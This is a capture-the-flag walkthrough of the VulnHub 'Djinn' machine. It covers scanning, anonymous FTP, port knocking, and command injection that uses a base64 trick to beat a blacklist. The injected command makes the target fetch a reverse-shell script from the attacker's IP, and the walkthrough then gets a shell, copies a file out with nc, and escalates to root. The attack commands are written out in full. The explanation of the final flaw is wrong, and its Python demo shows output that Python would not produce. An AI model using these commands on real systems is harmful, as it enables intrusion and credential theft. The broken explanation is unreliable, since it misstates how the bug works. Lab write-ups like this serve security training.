# Djinn | VulnHub
https://www.vulnhub.com/entry/djinn-1,397/

### 1. Scan
```bash
Nmap scan report for 192.168.34.154
Host is up, received arp-response (0.00070s latency).
Scanned at 2021-07-17 22:34:54 EDT for 97s
Not shown: 65531 closed ports
Reason: 65531 resets
PORT     STATE    SERVICE REASON         VERSION
21/tcp   open     ftp     syn-ack ttl 64 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.34.138
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   filtered ssh     no-response
1337/tcp open     waste?  syn-ack ttl 64
| fingerprint-strings: 
|   NULL: 
|     ____ _____ _ 
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|     '-', 5)
|   RPCCheck: 
|     ____ _____ _ 
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|_    '*', 7)
7331/tcp open     http    syn-ack ttl 64 Werkzeug httpd 0.16.0 (Python 2.7.15+)
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+
|_http-title: Lost in space
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.91%I=7%D=7/17%Time=60F3935B%P=x86_64-pc-linux-gnu%r(NU
SF:LL,1BC,"\x20\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__\
SF:x20_\x20_\x20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x20
SF:__\x20___\x20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20'_\
SF:x20`\x20_\x20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20'_\x
SF:20`\x20_\x20\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|\
SF:x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20\
SF:|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|\
SF:x20\|_\|\\___\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:n\nLet's\x20see\x20how\x20good\x20you\x20are\x20with\x20simple\x20maths
SF:\nAnswer\x20my\x20questions\x201000\x20times\x20and\x20I'll\x20give\x20
SF:you\x20your\x20gift\.\n\(6,\x20'-',\x205\)\n>\x20")%r(RPCCheck,1BC,"\x2
SF:0\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__\x20_\x20_\x
SF:20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x20__\x20___\x
SF:20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20'_\x20`\x20_\x
SF:20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20'_\x20`\x20_\x2
SF:0\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|\x20\|\x20\|
SF:\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20\|\x20\|\x20
SF:\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|\x20\|_\|\\_
SF:__\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\nLet's\x2
SF:0see\x20how\x20good\x20you\x20are\x20with\x20simple\x20maths\nAnswer\x2
SF:0my\x20questions\x201000\x20times\x20and\x20I'll\x20give\x20you\x20your
SF:\x20gift\.\n\(9,\x20'\*',\x207\)\n>\x20");
MAC Address: 00:0C:29:FD:04:03 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/17%OT=21%CT=1%CU=38148%PV=Y%DS=1%DC=D%G=Y%M=000C29%T
OS:M=60F393AF%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6
OS:=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Uptime guess: 16.847 days (since Thu Jul  1 02:16:18 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Unix
```
The machine is running FTP with anonymous access enabled, filtered SSH, something on port 1337 and a Python HTTP server on 7331. 

### 2. Look at FTP
Pull all the files off.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ wget --user anonymous --password anonymous -r ftp://192.168.34.154
--2021-07-17 22:41:25--  ftp://192.168.34.154/
           => ‘192.168.34.154/.listing’
Connecting to 192.168.34.154:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... done.    ==> LIST ... done.
...
FINISHED --2021-07-17 22:41:25--
Total wall clock time: 0.05s
Downloaded: 3 files, 252 in 0.007s (35.6 KB/s)
```
Check them out:
```bash
┌──(kali㉿kali)-[]-[~/Desktop/192.168.34.154]
└─$ cat message.txt game.txt creds.txt 
@nitish81299 I am going on holidays for few days, please take care of all the work. 
And don't mess up anything.

oh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the 
final level and get the prize.

nitu:81299
```
This gives a possible username "nitish81299", some creds `nitu:81299` and info about the game running port 1337.

### 3. Check out the game
```bash
┌──(kali㉿kali)-[]-[~/Desktop/192.168.34.154]
└─$ telnet 192.168.34.154 1337                                                                                                                                                                                                                                                                       1 ⨯
Trying 192.168.34.154...
Connected to 192.168.34.154.
Escape character is '^]'.
  ____                        _____ _                
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
                                                     

Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift.
(1, '+', 7)
> 8
(3, '-', 7)
> -4
(2, '+', 9)
> 11
(4, '+', 2)
```
The format of the questions seems pretty standard. This should be scriptable.

### 4. Beat the game
Write a script to beat the game (see play.py)
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ python3 play.py
[+] Opening connection to 192.168.34.154 on port 1337: Done
  ____                        _____ _                
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
                                                     

Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift.
(7, '-', 6)
>
1 - Question: 7-6
2 - Question: 6-1
3 - Question: 6*2
...
998 - Question: 7-5
999 - Question: 6/2
1000 - Question: 8*1
1001 - Question: 7*3
> Here is your gift, I hope you know what to do with it:

[+] Receiving all data: Done (19B)
[*] Closed connection to 192.168.34.154 port 1337

1356, 6784, 3409
```
The gift appears to be a port knocking sequence.

### 5. Knock on the ports
Then run another nmap.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ sudo nmap -p- -sV 192.168.34.154                                                                                                           1 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-17 23:25 EDT
Nmap scan report for 192.168.34.154
Host is up (0.0013s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
1337/tcp open  waste?
7331/tcp open  http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
```
SSH is now open. However, the creds don't work.

### 6. Check out the web server
The homepage is a default bootstrap static template page, not much to look at. Do some directory searching:
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ gobuster dir -u http://192.168.34.154:7331 -x txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.34.154:7331
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html
[+] Timeout:                 10s
===============================================================
2021/07/17 23:48:23 Starting gobuster in directory enumeration mode
===============================================================
/wish                 (Status: 200) [Size: 385]
/genie                (Status: 200) [Size: 1676]
```

The "wish" page has the text "Oh you found me then go on make a wish." with a text box and "execute" button. This seems like perfect command injection, except not quite. Commands do execute but their reponses appear in the URL in a redirected page. For example, running "id" redirects to a 404 page with the URL: http://192.168.34.154:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A. Also, typical reverse shell commands such as use of nc or even python reverse shells appear to be blacklisted, and return http://192.168.34.154:7331/genie?name=Wrong+choice+of+words.

### 7. Bypass the filter and get a shell
To bypass this filter, use base64 encoding. Using a two stage method, wget a python reverse shell script to the machine...
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ echo "wget http://192.168.34.138/rev.py" | base64
d2dldCBodHRwOi8vMTkyLjE2OC4zNC4xMzgvcmV2LnB5Cg==
```
and then execute it.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ echo "python rev.py" | base64                    
cHl0aG9uIHJldi5weQo=
```

The commands are entered one at a time, piping through base64 to decode and then into bash to be executed.
```
echo "d2dldCBodHRwOi8vMTkyLjE2OC4zNC4xMzgvcmV2LnB5Cg==" | base64 -d | bash
```
Running this results in a hit on the hosted file.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ sudo python3 -m http.server 80              
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.34.154 - - [17/Jul/2021 23:46:25] "GET /rev.py HTTP/1.1" 200 -
```
Then execute the below with the listener running.
```
echo "cHl0aG9uIHJldi5weQo=" | base64 -d | bash
```

Get the shell.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ nc -lvnp 9999         
listening on [any] 9999 ...
connect to [192.168.34.138] from (UNKNOWN) [192.168.34.154] 57748
/bin/sh: 0: can't access tty; job control turned off
$ id    
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 8. Enumerate from user
Check out app.py first off.
```python
www-data@djinn:/opt/80$ cat app.py
import subprocess

from flask import Flask, redirect, render_template, request, url_for

app = Flask(__name__)
app.secret_key = "key"

CREDS = "/home/nitish/.dev/creds.txt"

RCE = ["/", ".", "?", "*", "^", "$", "eval", ";"]


def validate(cmd):
    if CREDS in cmd and "cat" not in cmd:
        return True

    try:
        for i in RCE:
            for j in cmd:
                if i == j:
                    return False
        return True
    except Exception:
        return False


@app.route("/", methods=["GET"])
def index():
    return render_template("main.html")


@app.route("/wish", methods=['POST', "GET"])
def wish():
    execute = request.form.get("cmd")
    if execute:
        if validate(execute):
            output = subprocess.Popen(execute, shell=True,
                                      stdout=subprocess.PIPE).stdout.read()
        else:
            output = "Wrong choice of words"

        return redirect(url_for("genie", name=output))
    else:
        return render_template('wish.html')


@app.route('/genie', methods=['GET', 'POST'])
def genie():
    if 'name' in request.args:
        page = request.args.get('name')
    else:
        page = "It's not that hard"

    return render_template('genie.html', file=page)


if __name__ == "__main__":
    app.run(host='0.0.0.0', debug=True)

```
The list of blacklisted creds can be seen here. Also there is a creds.txt file defined.
```bash
www-data@djinn:/opt/80$ cat /home/nitish/.dev/creds.txt
nitish:p4ssw0rdStr3r0n9
```
The creds are `nitish:p4ssw0rdStr3r0n9`

Does nitish exist on the machine as a user?
```bash
www-data@djinn:/opt/80$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
sam:x:1000:1000:sam,,,:/home/sam:/bin/bash
nitish:x:1001:1001::/home/nitish:/bin/bash
```
Yes.

### 9. Login as nitish
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ssh nitish@192.168.34.154                                                                                                                                                                                                                                                                      130 ⨯
nitish@192.168.34.154's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-66-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

257 packages can be updated.
203 updates are security updates.


Last login: Thu Nov 14 20:32:20 2019 from 192.168.1.107
nitish@djinn:~$ id
uid=1001(nitish) gid=1001(nitish) groups=1001(nitish)
```

### 10. Enumerate from user
```bash
nitish@djinn:~$ sudo -l
Matching Defaults entries for nitish on djinn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nitish may run the following commands on djinn:
    (sam) NOPASSWD: /usr/bin/genie
```
The user can run genie as sam.

### 11. Investigate genie
```bash
nitish@djinn:~$ sudo -u sam /usr/bin/genie -h
usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish

I know you've came to me bearing wishes in mind. So go ahead make your wishes.

positional arguments:
  wish                  Enter your wish

optional arguments:
  -h, --help            show this help message and exit
  -g, --god             pass the wish to god
  -p SHELL, --shell SHELL
                        Gives you shell
  -e EXEC, --exec EXEC  execute command
```

Let's play around a bit.
```bash
nitish@djinn:~$ sudo -u sam /usr/bin/genie -p /bin/sh wish
Pass your wish to GOD, he might be able to help you.
nitish@djinn:~$ sudo -u sam /usr/bin/genie -p /bin/sh -g wish
We've added your wish to our records.
Continue praying!!
```

No idea how this is working. There is a manpage with more info.
```bash
nitish@djinn:~$ man /usr/bin/genie | cat

man(8)                                                                                                                                    genie man page                                                                                                                                   man(8)

NAME
       genie - Make a wish

SYNOPSIS
       genie [-h] [-g] [-p SHELL] [-e EXEC] wish

DESCRIPTION
       genie would complete all your wishes, even the naughty ones.

       We all dream of getting those crazy privelege escalations, this will even help you acheive that.

OPTIONS
       wish
              This is the wish you want to make .
       -g, --god
              Sometime we all would like to make a wish to god, this option let you make wish directly to God;
              Though genie can't gurantee you that your wish will be heard by God, he's a busy man you know;

       -p, --shell
              Well who doesn't love those. You can get shell. Ex: -p "/bin/sh"

       -e, --exec
              Execute command on someone else computer is just too damn fun, but this comes with some restrictions.

       -cmd
              You know sometime all you new is a damn CMD, windows I love you.

SEE ALSO
       mzfr.github.io
BUGS
       There are shit loads of bug in this program, it's all about finding one.
AUTHOR
       mzfr
```

The -cmd command wasn't specified in the tool help. Maybe this is a recent addition? Started fumbling around with this and somehow got a shell.
```bash
nitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd wish
Pass your wish to GOD, he might be able to help you.
nitish@djinn:~$ sudo -u sam /usr/bin/genie -g -cmd wish
We've added your wish to our records.
Continue praying!!
nitish@djinn:~$ sudo -u sam /usr/bin/genie -g -cmd id
my man!!
$ id
uid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
$ python -c "import pty;pty.spawn('/bin/bash')"
sam@djinn:~$ 
```

### 12. Enumerate from user
First thing to note is that the sam user is in the lxd group. This should mean escalation to root is possible from this user, however for some reason the commands are trying to execute under nitish's directory, and failing.
```bash
sam@djinn:/tmp$ lxc image import ./alpine.tar.gz --alias myimage
Error: mkdir /home/nitish/.config: permission denied
```

Decide to leave it, and move on to looking at Sam's sudo perms.
```bash
sam@djinn:/home/sam$ sudo -l
Matching Defaults entries for sam on djinn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sam may run the following commands on djinn:
    (root) NOPASSWD: /root/lago
```

Sam can run /root/lago.
```bash
sam@djinn:/home/sam$ sudo /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:4
work your ass off!!
```

Great, another game. Looking in Sam's home directory, there is a hidden .pyc file.
```bash
sam@djinn:/home/sam$ ls -la
total 36
drwxr-x--- 4 sam  sam  4096 Nov 14  2019 .
drwxr-xr-x 4 root root 4096 Nov 14  2019 ..
-rw------- 1 root root  417 Nov 14  2019 .bash_history
-rw-r--r-- 1 root root  220 Oct 20  2019 .bash_logout
-rw-r--r-- 1 sam  sam  3771 Oct 20  2019 .bashrc
drwx------ 2 sam  sam  4096 Nov 11  2019 .cache
drwx------ 3 sam  sam  4096 Oct 20  2019 .gnupg
-rw-r--r-- 1 sam  sam   807 Oct 20  2019 .profile
-rw-r--r-- 1 sam  sam  1749 Nov  7  2019 .pyc
-rw-r--r-- 1 sam  sam     0 Nov  7  2019 .sudo_as_admin_successful
sam@djinn:/home/sam$ file .pyc
.pyc: python 2.7 byte-compiled
```
Transfer it to the local machine with netcat:
```bash
sam@djinn:/home/sam$ nc 192.168.34.138 9999 < .pyc
```
Then decompile it.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ python2-docker "python -m pip install uncompyle6; uncompyle6 app.pyc"                                                                                                                                               1 ⨯
...                                                                                                                  
# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 19:51:05) 
# [GCC 9.2.0]
# Embedded file name: /home/mzfr/scripts/exp.py
# Compiled at: 2019-11-07 13:05:18
from getpass import getuser
from os import system
from random import randint

def naughtyboi():
    print 'Working on it!! '


def guessit():
    num = randint(1, 101)
    print 'Choose a number between 1 to 100: '
    s = input('Enter your number: ')
    if s == num:
        system('/bin/sh')
    else:
        print 'Better Luck next time'


def readfiles():
    user = getuser()
    path = input('Enter the full of the file to read: ')
    print 'User %s is not allowed to read %s' % (user, path)


def options():
    print 'What do you want to do ?'
    print '1 - Be naughty'
    print '2 - Guess the number'
    print '3 - Read some damn files'
    print '4 - Work'
    choice = int(input('Enter your choice: '))
    return choice


def main(op):
    if op == 1:
        naughtyboi()
    elif op == 2:
        guessit()
    elif op == 3:
        readfiles()
    elif op == 4:
        print 'work your ass off!!'
    else:
        print 'Do something better with your life'


if __name__ == '__main__':
    main(options())
# okay decompiling app.pyc
```

Looking at the code, this is a small script with several games. Only one appears to be interesting though - "Guess the number" which runs /bin/sh if the number is guessed correctly. This function isn't written correctly - "num" is not being converted to an integer before being compared. This means that the input from the user will instead be compared to the actual string "num", and the random number is ignored.
```python
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ python                                                               
Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
[GCC 9.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> num = 22
>>> string = 'num'
>>> string == num
True
```

### 13. Win the game and get root
```bash
sam@djinn:/home/sam$ sudo /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:2
Choose a number between 1 to 100: 
Enter your number: num
# whoami
root
```
